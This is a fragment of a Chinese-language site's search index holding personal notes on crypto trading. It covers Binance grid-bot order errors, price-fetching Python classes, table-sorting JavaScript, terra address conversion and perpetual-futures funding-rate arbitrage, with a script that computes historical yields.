\u4e0b\u5355\u65f6\u6307\u5b9a\u5305\u542b\u4ef7\u683c\u4fe1\u606f\u7684newClientOrderId\uff0c\u91cd\u590d\u4e0b\u5355\u81ea\u7136\u4f1a\u5931\u8d25\uff0c\u907f\u514d\u76f8\u540c\u7684\u8ba2\u5355\u91cd\u590d\u4e0b\u5355 APIError(code=-4015): Client order id is not valid. \uff0c\u4f46\u8fd9\u4e2a\u4fdd\u62a4\u53ea\u9488\u5bf9\u8fd8\u5728\u6302\u5355\u7684\u8ba2\u5355\uff0c\u76f8\u540c\u7684clientorderid\u5982\u679c\u524d\u8ff0\u8ba2\u5355\u5df2\u7ecf\u6210\u4ea4\uff0c\u4e0d\u4f1a\u963b\u6b62\u65b0\u7684\u63d0\u4ea4\u3002 \u5df2\u7ecf\u91cd\u590d\u4e0b\u5355 \uff1a\u9700\u8981\u6bd4\u5bf9\u5f53\u524d\u4ef7\u683c\u4e0e\u5b9a\u4e49\u597d\u7684\u7f51\u683c\u6570\u7ec4\uff0c\u5224\u65ad\u5f53\u524d\u5e94\u8be5\u7684\u4ed3\u4f4d\u662f\u591a\u5c11\uff0c\u7136\u540e\u4f7f\u7528\u5e02\u4ef7\u5355\u6216\u8005\u989d\u5916\u5728\u76f8\u90bb\u7f51\u683c\u4e0b\u5355\u4fdd\u8bc1\u4ed3\u4f4d\u7684\u6b63\u786e\u6027\uff0c\u6ce8\u610f\u6781\u7aef\u884c\u60c5\u4e0b\u81ea\u52a8\u8865\u4ed3\u4f9d\u636e\u7684\u4ed3\u4f4d\u4ef7\u503c\u53ef\u80fd\u6709\u8bef\u3002\u4f8b\u5982\u4e70\u5165\u662f\u9760\u5e73\u4ed3\u505a\u7a7a\u5b9e\u73b0\u7684\uff0c\u8fd9\u662f\u79cdreduceOnly\u7684\u8ba2\u5355\uff0c\u5fc5\u987b\u6709\u8db3\u591f\u591a\u7684\u505a\u7a7a\u4ed3\u4f4d\u624d\u80fd\u4e70\uff0c\u5426\u5219\u62a5\u9519\uff1a APIError(code=-2022): ReduceOnly Order is rejected. \u5df2\u7ecf\u4e0b\u7684 \u8ba2\u5355\u72b6\u6001\u53d8\u6210\u201c\u5df2\u8fc7\u671f\u201d \uff1a\u8fd9\u79cd\u8fd8\u662f\u56e0\u4e3a\u5df2\u7ecf\u53d1\u751f\u4e86\u8d85\u4e70/\u8d85\u5356\uff0c\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u5b98\u65b9\u8bf4\u660e\uff1a https://www.binance.com/zh-CN/support/faq/360039707291 \u4fdd\u8bc1\u91d1\u5ba1\u6838\u4e0d\u8fc7\uff08\u9488\u5bf9\u4e8e\u6b62\u76c8\u6b62\u635f\u5355\uff09\uff1a\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\u9700\u8981\u8bbe\u7f6e\u89e6\u53d1\u4ef7\u548c\u6210\u4ea4\u4ef7\uff08\u5e02\u4ef7\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u9700\u8981\u8bbe\u7f6e\u6839\u636e\u6807\u8bb0\u4ef7\u683c\u6216\u6700\u65b0\u4ef7\u683c\u89e6\u53d1\uff09\uff0c\u7cfb\u7edf\u4f1a\u8fdb\u884c\u4e24\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u5206\u522b\u5728\u4e0b\u5355\u524d\u548c\u6210\u4ea4\u524d\u3002\u8ba2\u5355\u89e6\u53d1\u4e4b\u540e\uff0c\u7cfb\u7edf\u4f1a\u7acb\u5373\u8fdb\u884c\u7b2c\u4e8c\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u82e5\u5f53\u524d\u53d1\u751f\u4e86\u4e8f\u635f\u6216\u5212\u8f6c\u51fa\u4e86\u4fdd\u8bc1\u91d1\uff0c\u5bfc\u81f4\u53ef\u7528\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u6b64\u65f6\u8ba2\u5355\u72b6\u6001\u4f1a\u663e\u793a\u5df2\u8fc7\u671f\u3002 \u4fdd\u8bc1\u91d1\u4e0d\u8db3 \uff1a\u76f4\u63a5\u628a\u6760\u6746\u500d\u6570\u53d8\u62102\u53ef\u4ee5\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u5373\u4f7f\u52a0\u6760\u6746\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u5f3a\u5e73\u4ef7\u683c\u3002 \u670d\u52a1\u5668\u7f51\u7edc\u4e0d\u53ef\u9760 \uff1a\u5728\u5176\u4ed6\u5730\u533a\u7684\u670d\u52a1\u5668\u540c\u65f6\u8dd1\u8f6e\u8be2\uff0c\u5373\u4f7f\u5355\u4e2a\u670d\u52a1\u5668\u6302\u6389\uff0c\u4e5f\u6709\u5176\u4ed6\u670d\u52a1\u5668\u9760\u8f6e\u8be2\u8865\u4e0a\u8ba2\u5355\uff0c\u4f46\u6ce8\u610f\u5206\u5e03\u5f0f\u540e\u65e5\u5fd7\u6536\u96c6\u662f\u4e2a\u65b0\u7684\u96be\u70b9 listenKeyExpired \uff1a\u6536\u5230\u8fd9\u79cd\u7c7b\u578b\u7684\u6d88\u606f\u9700\u8981\u91cd\u65b0\u8fde\u63a5\uff0c\u4e5f\u53ef\u4ee5\u4e3b\u52a8\u8f6e\u8be2\u7684\u65f6\u5019\u8c03\u7528futures_stream_get_listen_key\u5bf9\u73b0\u6709\u7684Listen Key\u8fdb\u884c\u5237\u65b0 function myparseFloat(text){ var res = parseFloat(text); if(text.endsWith(\"\u4ebf\")) return res*100000000; if(text.endsWith(\"\u4e07\")) return res*10000; return res; } function tdsortn(a,b,n){ if(myparseFloat(a.querySelector(\"td:nth-child(\"+n+\")\").textContent) > myparseFloat(b.querySelector(\"td:nth-child(\"+n+\")\").textContent) ) return 1; else return -1; } function tablebodysort(tbody, n, order){ var mylist=Array.prototype.slice.call(tbody.querySelectorAll(\"tr\"), 0); var sortList = Array.prototype.sort.bind(mylist); tbody.innerHTML=\"\"; for(var i of sortList(function(a,b){return -order*tdsortn(a,b,n)})) tbody.appendChild(i) } var rememerclick={2:1}; function tablesort_onclick(e){ var n = Array.from(e.target.parentElement.children).map((element, index)=>({element,index})).filter(({element})=>element==e.target)[0].index+1 var tbody = document.querySelector(\"#realtimeprofittbody\"); var order = rememerclick[n]==1?-1:1; tablebodysort(tbody, n, order); rememerclick[n] = order; } function registeronclick(){ for (var i of Array.prototype.slice.call(document.querySelectorAll(\"#realtimeprofit > table > thead > tr > th\"),1)){ i.onclick = tablesort_onclick; i.style[\"cursor\"]=\"pointer\"; } var tab=localStorage.getItem(\"watchtab\"); if(tab){eval(tab+\"()\")} rememerclick={2:1}; document.querySelectorAll(\"#realtimeprofittbody>tr>td\").forEach(function(i){if(i.innerText.trim().startsWith(\"-\")){i.style.backgroundColor=\"#c0ff90\"}}) } function triggerrefresh(){ fetch(\"https://api.py3.io/trigger_btc_refresh\").then(function(response) { if (!response.ok) { throw Error(response.statusText); } return response; }).then(function(response) { alert(\"\u66f4\u65b0\u6210\u529f\"); loadbtctable(); }).catch(function(error) { alert(\"\u89e6\u53d1\u66f4\u65b0\u5931\u8d25\uff0c\u8bf7\u7a0d\u540e\u518d\u6765\") }); } if(/refresh/.test(location.href)) triggerrefresh(); function showfull(){ localStorage.setItem(\"watchtab\",\"showfull\"); document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=\"\") } function showtrs(coins){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(coins.indexOf(i.querySelector(\".headcol\").innerText.trim())==-1?\"none\":\"\")) } function hidetrs(coins){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(coins.indexOf(i.querySelector(\".headcol\").innerText.trim())==-1?\"\":\"none\")) } function show_prefix(prefix){ document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(i=>i.style.display=(i.querySelector(\".headcol\").innerText.trim().startsWith(prefix)?\"\":\"none\")) } .md-grid{max-width:69rem;} .headcol { position: sticky; position: -webkit-sticky; background-color: white; width: 3rem; min-width: 3rem; max-width: 3rem; left: 0px; } th.headcol { background-color: #757575!important; } .md-typeset table:not([class]) tr:hover .headcol{ background-color: #f6f6f6; } .md-typeset table:not([class]) th{ min-width: 4rem; } \u83b7\u53d6\u4ea4\u6613\u6240\u4ef7\u683c\u4fe1\u606f \u00b6 \u5728\u7edf\u8ba1\u8d44\u4ea7\u65f6\u5bf9\u4ef7\u683c\u5b9e\u65f6\u6027\u6ca1\u6709\u8981\u6c42\uff0c\u53ef\u4ee5\u7f13\u5b5860\u79d2\uff1b\u7528\u6cd5\uff1a print(HUOBI_Price.btc) \uff0c\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\u7c7b\u578b class class_CEXPRICE (): def __init__ ( self ): self . updatetime = - 1 def __getattr__ ( self , token ): if time . time ()- self . updatetime >= 60 : print ( \"fetch\" , self , end = \"\" , flush = True ) self . data = self . fetchprice () print () self . updatetime = time . time () return self . handleprice ( token ) class class_HUOBI_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://api.huobi.pro/market/tickers\" , timeout = 5 ). json ()[ \"data\" ] def handleprice ( self , token ): return [ i for i in self . data if i [ \"symbol\" ]== token . lower ()+ \"usdt\" ][ 0 ][ \"close\" ] HUOBI_Price = class_HUOBI_Price () class class_BINANCE_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://api.binance.com/api/v3/ticker/price\" , timeout = 5 ). json () def handleprice ( self , token ): if \"busd\" not in token . lower (): token = token . lower ()+ \"usdt\" return [ i for i in self . data if i [ \"symbol\" ]== token . upper ()][ 0 ][ \"price\" ] BINANCE_Price = class_BINANCE_Price () class class_MXC_Price ( class_CEXPRICE ): def fetchprice ( self ): return sess . get ( \"https://www.mxc.com/open/api/v2/market/ticker\" , timeout = 5 ). json ()[ \"data\" ] def handleprice ( self , token ): return [ i for i in self . data if i [ \"symbol\" ]== token . upper ()+ \"_USDT\" ][ 0 ][ \"last\" ] MXC_Price = class_MXC_Price () terra\u5730\u5740\u8f6c\u4e3a\u4ee5\u592a\u574a\u5730\u5740 \u00b6 \u4f9d\u8d56\u5e93\uff1a pip3 install bech32 import bech32 words = bech32 . bech32_decode ( terra_addr )[ 1 ] ethaddr = \"\" . join ([ hex ( i )[ 2 :] . rjust ( 2 , \"0\" ) for i in bech32 . convertbits ( words , 5 , 8 , False )]) \u53cd\u8fc7\u6765\u5c31\u662f words = [int(ethaddr[i:i+2], 16) for i in range(0,40,2)] terra_addr = bech32.bech32_encode(\"terra\", bech32.convertbits(words, 8, 5, False))","title":"Bitcoin"},{"location":"Bitcoin/#bitcoin","text":"function showwatch1(){ localStorage.setItem(\"watchtab\",\"showwatch1\"); tablebodysort(document.querySelector(\"#realtimeprofittbody\"), 6, 1); var idx=1; document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(function (i){ var text = i.querySelector(\".headcol\").innerText.trim(); if(text.startsWith(\"u\")||text.startsWith(\"h\")||idx>10||i.querySelector(\"td:nth-child(2)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(3)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(4)\").textContent.indexOf(\"-\")==0||i.querySelector(\"td:nth-child(5)\").textContent.indexOf(\"-\")==0){ i.style.display=\"none\"; return } i.style.display=\"\"; idx+=1; }) } function showwatch2(){localStorage.setItem(\"watchtab\",\"showwatch2\");return showtrs(['SHIB','XCH','ICP','FIL','KSM','hBNB','hLTC','hBTCDOM'])} function showwatch3(){localStorage.setItem(\"watchtab\",\"showwatch3\");return showtrs(['KSM','ANT','SHIB','XCH','BSV','DOGE'])} function showwatch4(){localStorage.setItem(\"watchtab\",\"showwatch4\");return showtrs(['KSM','FIL','XCH'])} function showwatch_huobi(){localStorage.setItem(\"watchtab\",\"showwatch_huobi\");document.querySelector(\"#realtimeprofittbody\").querySelectorAll(\"tr\").forEach(function(i){ var c = i.querySelector(\".headcol\").innerText.trim()[0] i.style.display=(c==c.toLowerCase()?\"none\":\"\") })} function showwatch_huobiu(){localStorage.setItem(\"watchtab\",\"showwatch_huobiu\");return show_prefix(\"u\")} function showwatch_binance(){localStorage.setItem(\"watchtab\",\"showwatch_binance\");return show_prefix(\"b\")} function showwatch_binanceu(){localStorage.setItem(\"watchtab\",\"showwatch_binanceu\");return show_prefix(\"h\")} function showwatch_okex(){localStorage.setItem(\"watchtab\",\"showwatch_okexu\");return show_prefix(\"o\")} \u6211\u4e5f\u6765\u8bd5\u6c34\u5f53\u4e2a\u88ab\u5272\u7684\u97ed\u83dc\u4e86","title":"Bitcoin"},{"location":"Bitcoin/#_1","text":"\u4ee5\u4e0b\u4e3a\u5b9e\u65f6\u6536\u76ca\u7387\u6570\u636e\uff08\u6bcf\u5929\u66f4\u65b0\u4e00\u6b21\uff09\uff1a Code \u9884\u6d4b\u6536\u76ca\uff1a\u4e0b\u4e00\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u786e\u5b9a\u503c\uff09+\u4e0b\u4e0b\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u9884\u4f30\u503c\uff0c\u968f\u4ef7\u5dee\u6ce2\u52a8\uff09\uff0c\u5355\u4f4d\u4e3a\u5343\u5206\u4e4b \u6628\u65e5\u6536\u76ca\uff1a\u6700\u8fd1\u4e09\u6b21\u7ed3\u7b97\u7684\u7d2f\u8ba1\u6536\u76ca 7\u65e5\u5e74\u5316\uff1a\u6700\u8fd121\u6b21\u7ed3\u7b97\u5e73\u5747\u6536\u76ca \u5177\u4f53\u8ba1\u7b97\u89c1\u4e0a\u6587 \u8ba1\u7b97\u6536\u76ca\u7387 \u663e\u793a\u5168\u90e8 \u5173\u6ce81 \u5173\u6ce82 \u5173\u6ce83 \u5173\u6ce84 \u706b\u5e01 \u706b\u5e01u \u5e01\u5b89 \u5e01\u5b89u OKex https://d.py3.io/btc.html","title":"\u5957\u5229\u5b9e\u65f6\u6536\u76ca\u7387"},{"location":"Bitcoin/#_2","text":"\u4ee5\u706b\u5e01\u7684btc\u5408\u7ea6\u4e3a\u4f8b\uff0c\u4ea4\u6613\u5355\u4f4d\u6700\u5c0f\u662f\u4e00\u5f20100 USD\u7f8e\u5143\uff08\u5176\u4ed6\u5e01\u79cd\u90fd\u662f10\u7f8e\u5143\uff09 \u4ea4\u6613\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\uff0c\u6323\u5230\u7684\u4e5f\u662fbtc \u4e70\u51651\u5f20\u770b\u6da8 \u505a\u591a \uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u7528100USD\u4e70\u5165btc\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u5e01\uff0c\u671f\u5f85\u6bd4\u7279\u5e01\u4ef7\u683c\u4e0a\u6da8\uff1b\u627f\u8bfa\u672a\u6765\u4f1a\u5356\u51fabtc\u5e73\u4ed3\u5f97\u5230100USD\u8fd4\u8fd8\uff0c\u5728\u5e73\u4ed3\u65f6\u5982\u679c\u771f\u7684\u6da8\u4e86\uff0c\u90a3\u65f6\u9700\u8981\u5356\u51fa\u7684btc\u5c31\u6bd4\u5f53\u65f6\u5f00\u4ed3\u65f6\u7684\u6570\u91cf\u5c11\uff0c\u8fd9\u4e2a\u5dee\u5f02\u7684\u90e8\u5206\u5c31\u662f\u6323\u5230\u7684btc\uff1b\u5982\u679cbtc\u4ef7\u683c\u4e00\u76f4\u4e0b\u8dcc\uff0c\u8d26\u6237\u91cc\u6240\u6709\u7684btc\u5356\u51fa\u90fd\u4e0d\u591f100USD\u5c31\u7206\u4ed3\u4e86\uff08\u5b9e\u9645\u7206\u4ed3\u89c4\u5219\u66f4\u590d\u6742\uff09 \u5356\u51fa1\u5f20\u770b\u8dcc \u505a\u7a7a \uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u5356\u51fabtc\u624b\u4e0a\u62ff\u7740100USD\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u7f8e\u5143\uff08\u7136\u800c\u5e76\u4e0d\u80fd\u62ff\u5230\u7f8e\u5143\uff09\uff0c\u627f\u8bfa\u672a\u6765\u4f1a\u628a\u8fd9100\u7f8e\u5143\u4e70\u56debtc\uff0c\u5982\u679c\u6309\u9884\u671f\u771f\u7684\u8dcc\u4e86\u5e73\u4ed3\u65f6\u5c31\u80fd\u4e70\u5230\u66f4\u591a\u7684btc\u3002\u6ce8\u610f\u5230\u4e70\u5356\u8fd9\u4e2a\u671f\u8d27\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\u7684\uff0c\u6240\u4ee5\u5982\u679c\u4e0d\u52a0\u6760\u6746\u505a\u7a7a\uff0c\u5c31\u5b8c\u5168\u7b49\u4ef7\u4e8e\u5356\u51fa\u6301\u6709\u7684btc\uff0c\u4e0d\u5b58\u5728\u7206\u4ed3\u98ce\u9669\uff0c\u4e5f\u5c31\u662f\u8bf4\u60f3\u771f\u6b63\u505a\u7a7a\uff08\u82b1\u4eba\u6c11\u5e01\u8d4cbtc\u8dcc\uff09\u5fc5\u987b\u4e0a\u6760\u6746","title":"\u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd"},{"location":"Bitcoin/#_3","text":"\u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5957\u671f\u4fdd\u503c\u7684\u64cd\u4f5c\uff0c\u662f\u5957\u5229\uff0c\u4e0d\u662f\u9ad8\u9891\u4ea4\u6613\u7b56\u7565\uff0c\u5efa\u4ed3\u540e\u65e0\u9700\u64cd\u4f5c\uff0c\u53ea\u9700\u8981\u89c2\u5bdf\u662f\u5426\u8d8b\u52bf\u53cd\u8f6c\u51b3\u5b9a\u5e73\u4ed3\u65f6\u673a\uff0c\u4f8b\u5982\u5f53\u4e03\u65e5\u5e74\u5316\u6536\u76ca\u4e3a\u8d1f\u65f6\u5e73\u4ed3\u5356\u51fa \u671f\u8d27\u5408\u7ea6\u7684\u4ea4\u6613\u4ef7\u683c\u4e3a\u5565\u4f1a\u4e0e\u73b0\u8d27(BTC/USDT)\u76f8\u5dee\u4e0d\u5927\u5462\uff1f\u56e0\u4e3a\u5b58\u5728\u6bcf8\u4e2a\u5c0f\u65f6\u7684\u7ed3\u7b97\u673a\u5236\uff0c\u5982\u679c\u5408\u7ea6\u4ef7\u683c>\u73b0\u8d27\u4ef7\u683c\uff0c\u8bf4\u660e\u591a\u65b9\u5360\u4f18\uff0c\u5219\u591a\u65b9\u5411\u7a7a\u65b9\u652f\u4ed8\u8d44\u91d1\u8d39\uff0c\u59820.01%\uff08\u5177\u4f53\u6570\u503c\u4e0e\u4ef7\u5dee\u76f8\u5173\uff09\u3002 \u5b98\u65b9\u8bf4\u660e \u5957\u5229\u64cd\u4f5c\uff1a\u7528usdt\u4e70\u5165\u5e01\u79cd\uff0c\u7acb\u523b\u4e0b\u7a7a\u5355\u65e0\u6760\u6746\u505a\u7a7a\u76f8\u540c\u6570\u91cf\u2014\u2014\u8fd9\u6837\u6211\u4eec\u4e00\u4e70\u4e00\u5356\u76f8\u5f53\u4e8e\u6ca1\u6709\u4e70\u5165\uff0c\u8d44\u4ea7\u51c0\u503c\u4e0d\u53d7\u5e01\u4ef7\u6ce2\u52a8\u5f71\u54cd\uff0c\u53ea\u662f\u505a\u7a7a\u6536\u53d6\u8d44\u91d1\u8d39 \u5177\u4f53\u64cd\u4f5c\uff1a\u5148\u5728\u6cd5\u5e01\u4ea4\u6613\u7528\u4eba\u6c11\u5e01\u4e70usdt\uff0c\u7136\u540e\u5728\u5e01\u5e01\u4ea4\u6613\u4e70\u516510.1usdt\u7684\u5e01\uff08\u591a\u4e70\u4e00\u70b9\u7ed9\u6263\u624b\u7eed\u8d39\uff09\uff0c\u7acb\u523b\u8f6c\u5165\u6c38\u7eed\u5408\u7ea6\u8d26\u6237\u5f00\u59cb1\u500d\u505a\u7a7a\u4e00\u5f20\uff0c\u7136\u540e\u957f\u671f\u6301\u6709\u76f4\u5230\u8d8b\u52bf\u53cd\u8f6c\uff08\u6301\u7eed\u652f\u4ed8\u8d44\u91d1\u8d39\uff09\u3002 \u4e0d\u8981\u770b\u8d26\u6237\u7684\u6536\u76ca\u7387\uff0c\u8fd9\u4e2a\u5355\u5355\u662f\u505a\u7a7a\u672c\u8eab\u76f8\u5f53\u4e8e\u6301\u5e01\u7684\u6536\u76ca\u7387\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u6301\u5e01\uff0c\u6b63\u786e\u7684\u6536\u76ca\u8ba1\u7b97\u5e94\u8be5\u662f\u8d26\u6237\u6743\u76ca\uff08\u5e01\u7684\u6570\u91cf\uff09*\u5f53\u524d\u5e01\u5e01\u4ea4\u6613\u4ef7\u683c\uff0c\u6536\u76ca\u7684\u57fa\u51c6\u6bd4\u8f83\u5e94\u8be5\u662f\u4f4e\u98ce\u9669\u503a\u5238\u800c\u4e0d\u662f\u9ad8\u98ce\u9669\u6301\u5e01 \u5386\u53f2\u6570\u636e\u67e5\u8be2\uff1a \u8d44\u91d1\u8d39\u7387 \u7ed3\u7b97\u4ef7\u683c \u722c\u53d6\u4e00\u4e0b\u5386\u53f2\u6570\u636e\uff1a\uff08\u770b\u8d77\u6765ONT\u5957\u5229\u6536\u76ca\u6700\u9ad8\uff0c\u4e0d\u8fc7\u4e0a\u7ebf\u65f6\u95f4\u4e0d\u591f\u957f\u4e0d\u5177\u6709\u4ee3\u8868\u6027\uff09 \u8ba1\u7b97\u6536\u76ca\u7387 \u65f6\u4e0d\u80fd\u7b80\u5355\u5bf9\u5355\u6b21\u6536\u76ca\u7387\u6c42\u548c\uff0c\u5e94\u8be5\u8003\u8651\u5e01\u4ef7\u6ce2\u52a8\u5bf9\u6700\u540e\u5b9e\u9645\u6536\u76ca\u7684\u5f71\u54cd\uff1a\u5047\u8bbe\u6295\u51651USD\uff0c\u8ba1\u7b97\u6bcf\u6b21\u7ed3\u7b97\u80fd\u6536\u5230\u591a\u5c11\u5e01\uff0c\u7d2f\u52a0\u540e\u6309\u6700\u8fd1\u4e00\u6b21\u7ed3\u7b97\u4ef7\u8ba1\u7b97\u8fd9\u4e9b\u5e01\u503c\u591a\u5c11USD\uff0c\u9664\u4ee5\u7ed3\u7b97\u6b21\u6570\u4e58\u4ee5\u4e00\u5e74\u7684\u7ed3\u7b97\u6b21\u6570\u5373\u4e3a\u5e74\u5316\u6536\u76ca import requests , os , sys , time from decimal import Decimal from functools import lru_cache sess = requests . session () @lru_cache () def getdata ( coin , page = 1 ): page = str ( page ) data = [ Decimal ( i [ 'final_funding_rate' ]) for i in sess . get ( \"https://futures.huobi.com/swap-order/x/v1/swap_funding_rate_page?contract_code=\" + coin + \"-USD&page_index=\" + page + \"&page_size=100\" , headers = { \"source\" : \"web\" }) . json ()[ \"data\" ][ \"settle_logs\" ]] settle = [ Decimal ( i [ \"instrument_info\" ][ 0 ][ \"settle_price\" ]) for i in sess . get ( \"https://futures.huobi.com/swap-order/x/v1/swap_delivery_detail?symbol=\" + coin + \"&page_index=\" + page + \"&page_size=100\" , headers = { \"source\" : \"web\" }) . json ()[ \"data\" ][ \"delivery\" ]] return data , settle def calc_fullprofit ( coin ): data , settle = [], [] page = 1 x = getdata ( coin ) while len ( x [ 0 ]): data . extend ( x [ 0 ]) settle . extend ( x [ 1 ]) page += 1 x = getdata ( coin , page ) profit_coin = sum ([ k / settle [ i ] for i , k in enumerate ( data )]) profit_usd = profit_coin * settle [ 0 ] return \" %.2f \" % ( profit_usd / len ( data ) * 3 * 365 * 100 ) + \"%\" , len ( data ) data = [] for i in \"BTC ETH EOS LINK BCH BSV LTC XRP ETC TRX ADA ATOM IOTA NEO ONT XLM XMR DASH ZEC\" . split ( \" \" ): profit , length = calc_fullprofit ( i ) data . append ([ i , profit , length ]) data . sort ( key = lambda i : i [ 1 ], reverse = True ) for i , profit , length in data : print ( \"\" , i , profit , length , \"\" , sep = \"|\" ) \u98ce\u9669\uff1a From \u6570\u5b57\u5e01\u5957\u5229\u7b80\u53f2\uff08\u4e0b\uff09 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8d44\u91d1\u8d39\u7387\u7684\u5957\u5229\u66f4\u52a0\u9002\u5408\u8d8b\u52bf\u4e0a\u6da8\u7684\u884c\u60c5\uff0c\u800c\u4e14\u8981\u7559\u610f\u884c\u60c5\u7684\u53cd\u8f6c\u5bfc\u81f4\u8d39\u7387\u8d8b\u52bf\u7684\u626d\u8f6c\uff0c\u53ef\u80fd\u4f1a\u5957\u5229\u5931\u6548\uff1b\u8fd8\u6709\u5c31\u662f\u5bf9\u4e8e\u50cf18\u5e74\u7684\u8d8b\u52bf\u4e0b\u8dcc\u884c\u60c5\uff0c\u867d\u7136\u5957\u5229\u903b\u8f91\u4e00\u6837\uff0c\u4f46\u64cd\u4f5c\u4f1a\u66f4\u52a0\u590d\u6742\uff0c\u56e0\u4e3a\u8fd9\u91cc\u9762\u8981\u6d89\u53ca\u5230\u6c38\u7eed\u5408\u7ea6+\u4ea4\u5272\u5408\u7ea6\u7684\u7ec4\u5408\u5bf9\u51b2\uff0c\u5360\u7528\u5e01\u6570\u4e5f\u4f1a\u7ffb\u500d\uff0c\u4e5f\u5c31\u662f\u8bf4\u540c\u6837\u7684\u5e01\u91cf\u5957\u5229\u5e74\u5316\u6536\u76ca\u7387\u8981\u62535\u6298\uff1b\u6240\u4ee5\uff0c\u597d\u597d\u73cd\u60dc\u8fd9\u6765\u4e4b\u4e0d\u6613\u7684\u597d\u884c\u60c5\u5427\u3002 \u4ea4\u6613\u671f\u95f4\u624b\u901f\u6162\u6216\u4ea4\u6613\u4e0d\u6d3b\u8dc3\u4f1a\u5bfc\u81f4\u4e70\u5165\u73b0\u8d27\u4ef7\u683c\u9ad8\u4e8e\u505a\u7a7a\u4ef7\u683c\uff0c\u5bfc\u81f4\u989d\u5916\u7684\u6210\u672c\u635f\u8017\uff1b\u6301\u6709\u671f\u95f4\u7684\u6700\u5927\u98ce\u9669\u5728\u4e8e\u7f8e\u5143\u8d2c\u503c\u7684\u98ce\u9669\uff0c\u4f8b\u5982USDT 7.1\u4e70\u5165\uff0c\u6700\u540e6.9\u5356\u51fa\uff0c\u5373\u4e3a28.2\u2030\u4e8f\u635f \u53e6\u5916\uff0c\u5982\u679cbtc\u6301\u7eed\u4e0a\u6da8\uff0c\u5728\u6301\u4ed3\u4e2d\u770b\u5230\u505a\u7a7a\u4e8f\u4e86\u767e\u5206\u4e4b\u591a\u5c11\u8fd8\u662f\u6709\u70b9\u5fc3\u75db\u7684\uff0c\u8fd9\u5c31\u9700\u8981\u826f\u597d\u7684\u5fc3\u7406\u7d20\u8d28\uff0c\u5957\u5229\u76f8\u6bd4\u4e8e\u6301\u5e01\u52a8\u8f84\u4e00\u592910%\u7684\u6ce2\u52a8\u5c31\u6323\u4e0d\u5230\u591a\u5c11\u94b1hhh","title":"\u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229"},{"location":"Bitcoin/#_4","text":"\u4e0a\u8ff0\u80fd\u88ab\u9009\u51fa\u7684\u8d44\u91d1\u8d39\u7387\u9ad8\u7684\u5957\u5229\u5e01\u79cd\uff0c\u5f80\u5f80\u4e5f\u662f\u6da8\u5e45\u5de8\u5927\u7684\u5e01\u79cd\uff0c\u53ef\u80fd\u8fd8\u4e0d\u5982\u7b80\u5355\u6301\u5e01\u8d5a\u5f97\u66f4\u591a\uff0c\u4e8e\u662f\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u7a33\u59a5\u7f51\u683c\u3002\u7f51\u683c\u7684\u4e00\u4e2a\u7f3a\u70b9\u5728\u4e8e\u8d44\u91d1\u5229\u7528\u7387\u4f4e\uff0c\u7b49\u7740\u6284\u5e95\u4e70\u5165\u7684\u8d44\u91d1\u662f\u95f2\u7f6e\u7684\uff0c\u81ea\u7136\u60f3\u5230\u53ef\u4ee5\u628a\u4e0a\u8ff0\u8d44\u91d1\u8d39\u7387\u5957\u5229\u7ed3\u5408\u8d77\u6765\uff0c\u8fd8\u6ca1\u4e70\u5165\u7684\u90e8\u5206\u5c31\u7b49\u91cf\u505a\u7a7a\uff0c\u4f18\u70b9\u5728\u4e8e\uff1a \u8fd8\u6ca1\u4e70\u5165\u7684\u6284\u5e95\u8d44\u91d1\u80fd\u8d5a\u53d6\u8d44\u91d1\u8d39\u7387\uff0c\u4e0d\u5b8c\u5168\u95f2\u7f6e \u6ca1\u6709usdt\u66b4\u96f7\u98ce\u9669\uff0c\u5e01\u672c\u4f4d\u6c38\u7eed\u5408\u7ea6\u6302\u94a9\u7684\u662f\u7f8e\u5143\u800c\u4e0d\u662fusdt \u624b\u7eed\u8d39\u4f4e\uff0c\u706b\u5e01\u73b0\u8d27\u4ea4\u6613\u53432\uff0c\u5e01\u5b89\u5408\u7ea6\u4ea4\u6613maker\u53ea\u6709\u4e071.5 \u8c03\u7528\u5e01\u5b89python sdk\u81ea\u52a8\u6302\u5355\uff0c\u4ee3\u7801\u903b\u8f91\u662f\uff1a \u83b7\u53d6\u5f53\u524d\u6240\u6709\u7684\u6302\u5355\uff0c\u6bd4\u5bf9\u914d\u7f6e\u7684\u4ef7\u683c\u6570\u7ec4\uff0c\u627e\u5230\u7f3a\u5931\u7684\u4ef7\u683c\u4eec\u3002 